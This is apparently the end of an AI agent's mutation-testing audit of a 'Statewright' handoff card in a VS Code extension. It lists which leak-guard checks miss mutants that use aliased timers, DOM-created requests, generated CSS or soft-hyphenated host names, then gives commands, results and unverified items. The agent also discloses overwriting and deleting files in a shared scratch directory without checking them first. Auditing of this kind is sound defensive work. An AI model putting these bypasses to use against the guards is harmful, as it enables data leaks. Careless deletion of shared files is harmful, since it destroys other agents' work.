- **Timers through an alias** pass the scan and are killed by the jsdom counters. Schedulers that are not timers (`requestIdleCallback`, Web Animations) pass everything.
- **DOM-created elements** (`createElement('img')`, `iframe`, `form.submit()`) are on no deny list. They are killed by Playwright when they fire during render, hover or the 4 s idle, and survive when they fire on a trigger no test performs (Configure click, hub event, scroll, right-click, later renders).
- **Handlers**: `\bon[a-z]+\s*=` has false negatives (`onWheel=`, `setAttribute('on...', ...)`, object-literal methods) and false positives (`once =`, `only =`).
- **A second listener at import time from the handoff module** is possible without `=>`, `function` or the word `addEventListener` (Y11, killed by Playwright because it acts on a tested click; Y13 survives because it acts on scroll).
- **Renderer `STYLE`** is outside the closed style list. `::after` inside the card is caught by Playwright (Y14); generated content just outside it (Y15) and non-`display` hiding (Y16) are not.
- **Host-name encodings**: a split name defeats the name scans but not the Playwright route (Y24 killed). The soft hyphen defeats every text scan and, being text and not a request, survives (Y21).

## Test soundness (attack item 3)

- **Vacuity.** I found no assertion that cannot fail by construction, and every new test (all five source tests, all three jsdom test kinds, all four Playwright tests) is failed by at least one mutant above. I did not map each individual assertion to a mutant that reaches it first; some (the page-title check, the `localhost|workspace|secret` check on the card HTML) sit behind stricter assertions. Two tests promise more than they check: the style test (B1) and "contains no code" (N3).
- **`routeWebSocket`.** Proven by X12: the Playwright failure lists three `{ referer: 'websocket', url: 'wss://statewright.ai/live?w=%3Fworkspace%3Dsecret-workspace' }` records.
- **"4 lines mention Statewright".** Sound for the current page: `innerText` of the visible body yields exactly the heading, the disclaimer, the link and the address, because the card's flex containers put each on its own line and hidden tabs contribute nothing. It will fail if any other visible element of the Console ever names Statewright, which is the intent.
- **4-second idle.** A fixed wait, not a race. No flake observed.
- **Flakiness.** `npx playwright test src/test/ui/statewright-handoff.spec.ts src/test/ui/integrations-catalog.spec.ts --repeat-each=5`: 45 passed in 33.7 s. The same two specs were also green in 50 further runs (the mutants they do not detect), while other agents' test jobs were loading the machine. Mocha, three files, five consecutive runs: 32 passing each time.
- **Global state.** See N8.

## Tests run at the exact commit

| Command (in `FailSafe/extension`, Node 22.23.4) | Result |
|---|---|
| `npm run compile` | exit 0 |
| `npx mocha --ui tdd --timeout 15000` on the three compiled test files | 32 passing (x6 runs) |
| Playwright, the two specs, standard config | 9 passed |
| Playwright, the two specs, `--repeat-each=5`, standard config | 45 passed |
| Playwright, the two specs, audit config (host resolver mapped to 127.0.0.1, DNS guard) | 9 passed |
| 54 earlier mutants + 51 new ones, each against mocha (3 files) and Playwright (2 specs) | tables above |
| Chromium probe (real ConsoleServer, context-wide routes) of the unmutated source and 32 mutants | results quoted in B1, B2, N1, N2, N4, N9 and the Y table |
| Six harmless renderer edits against the mocha files | N7 |
| `node --test src/test/docs/integration-contracts.test.cjs src/test/docs/integration-claims.test.cjs` | 101 pass, 0 fail |
| `npm run lint` | 0 errors, 136 warnings, none in the files of this change |
| `node scripts/validate-vsix.cjs --source-only` | PASS, v6.0.12 |
| `npm run test:runner-coverage` | PASS, 752 test files, all claimed |
| `npm run test:citation-parity` | PASS |
| `npm run test:node` | 1067 pass, 1 fail, 18 skipped. The one failure is `bundled dependencies (C2 T5)` (`bundleDeps.test.cjs`), the known junction artefact |
| Ledger and gate hashes | report 1 `56527ea7...` and report 2 `4851cf12...` match entries #938 and #939; plan hash matches `plan-iter3.json` |

## Not verified

- `npm test` (vscode-test) and the full `test:all` gate. The new source test resolves the modules from `src/` relative to `out/test/roadmap`, which works from a development checkout; I did not run it under the extension host.
- CI for HEAD or for `dd766c15`. The remote branch is at `1fd4a557`. I made no GitHub request.
- The plan's installed-host table: both VSIX hashes, the 14-of-14 results, the redirect to `https://statewright.ai/login?redirect=/runs`, the absence of referrer, cookie and opener on the real click. These runs were performed outside the repository. I could not verify them and I do not treat them as false. Two VSIX files with matching names exist in the session scratch directory; I did not open or hash them.
- That `https://statewright.ai/runs` exists, requires sign-in and shows runs and transition history. No request was made to the host.
- A fresh VSIX build and packaging of `statewright-handoff.js`. The second audit assessed this from `bundle.cjs`; the shipped files have not changed since.
- The plan's "26 mutants" beyond the nine named survivors, which I re-ran. The other entries are recorded only outside the repository.
- Real-browser effect of Y52 (see the table) and of X15 and X16 (unchanged code; the probe did not capture card classes or button labels).
- Whether a strict reviewer would in fact miss Y06. That is a judgement, stated as such in B2.

## State left behind

- `git status --short` in the worktree prints nothing. `git diff --quiet HEAD -- FailSafe CHANGELOG.md` is clean. HEAD is still `45a78c4da50ad9ed22a7976f58533df7c2625981`.
- No mutation was ever applied to the audited worktree, with one exception at the start: an aborted first runner applied mutants there in sequence and I stopped it; I restored the two files with `git checkout --` and confirmed the status clean before continuing. All recorded results come from disposable `git archive` exports of HEAD in the session scratch directory, which are deleted (their `node_modules` junctions were unlinked first; the junction target still has its 507 entries).
- In `FailSafe/extension` only gitignored build output changed (`out/` from `npm run compile`, `test-results/`).
- This report is the only file added to the repository tree (under the gitignored `.agent/`). `AUDIT_REPORT-653.md` and `AUDIT_REPORT-653-iter2.md` are untouched (sha256 unchanged: `56527ea7...`, `4851cf12...`).
- Nothing was committed, pushed or posted.
- Session scratch directory (outside the repository, shared with earlier agents of this session): I kept my evidence there (`mutants.cjs`, `orig.cjs`, `run.cjs`, `guard.cjs`, `results-orig.jsonl`, `results-y.jsonl`, `probe/`, `probe-results*.jsonl`, `harmless.cjs`, `razor.cjs`). Disclosure: before I noticed the directory was shared I wrote `guard.cjs`, `run.cjs`, `razor.cjs`, `pre.cjs` and `mutants.cjs` by name and deleted `results.jsonl`, `run.log` and `dns.log` without checking whether earlier files of those names existed. The second auditor's `muts.cjs` and the author's `s653/` directory are intact.
- During the run four detached runner processes of mine outlived a first stop attempt and briefly mutated a scratch export concurrently with a new run; I discarded those results, killed the processes by PID and re-ran everything. Other agents' node processes on the machine were not touched.
